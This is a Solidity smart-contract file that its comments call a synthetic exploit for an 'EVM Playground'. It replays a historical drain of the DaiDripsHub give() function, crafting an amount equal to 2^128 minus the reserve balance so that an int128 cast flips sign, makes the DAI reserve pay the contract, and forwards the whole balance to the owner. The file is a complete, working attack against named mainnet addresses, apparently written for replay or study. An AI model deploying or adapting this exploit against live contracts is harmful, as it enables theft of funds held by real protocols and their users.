// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone synthetic exploit for the EVM Playground.
// Mirrors the historical DaiDripsHub.give() int128-cast drain without Foundry
// cheatcodes: craft amt = 2^128 - reserveBal so -int128(amt) flips the signed
// transfer and DaiReserve pays the caller, then sweep DAI to the attacker EOA.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IDaiDripsHub {
    function give(address receiver, uint128 amt) external;
}

/// @dev Deployed by the playground recorder; attack() is the recorded entrypoint.
contract DripsDaiHubExploit {
    address constant HUB = 0x73043143e0A6418cc45d82D4505B096b802FD365;
    address constant RESERVE = 0xF9BBb2dF44cfe46e501cf91c99B2f8FeF9D9d44A;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    // Arbitrary give receiver (historical used 0x962f…); collectable credit is
    // irrelevant to the drain — the signed transfer is what moves funds.
    address constant GIVE_RECEIVER = 0x962f827743078B18cf437f1DeEA721b42dD19F8c;

    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");

        // Full reserve balance at fork — historical R.
        uint256 reserveBal = IERC20(DAI).balanceOf(RESERVE);
        require(reserveBal > 0 && reserveBal <= type(uint128).max, "bad reserve");

        // amt = 2^128 - reserveBal  (fits in uint128 when reserveBal > 0)
        // int128(amt) wraps to -int128(reserveBal)
        // -int128(amt) becomes +reserveBal → _transfer withdraw branch
        uint128 amt = uint128(type(uint128).max - uint128(reserveBal) + 1);

        // msg.sender to hub is this contract → hub pays THIS contract
        IDaiDripsHub(HUB).give(GIVE_RECEIVER, amt);

        uint256 profit = IERC20(DAI).balanceOf(address(this));
        require(profit == reserveBal, "profit mismatch");
        require(IERC20(DAI).transfer(owner, profit), "transfer failed");
    }
}
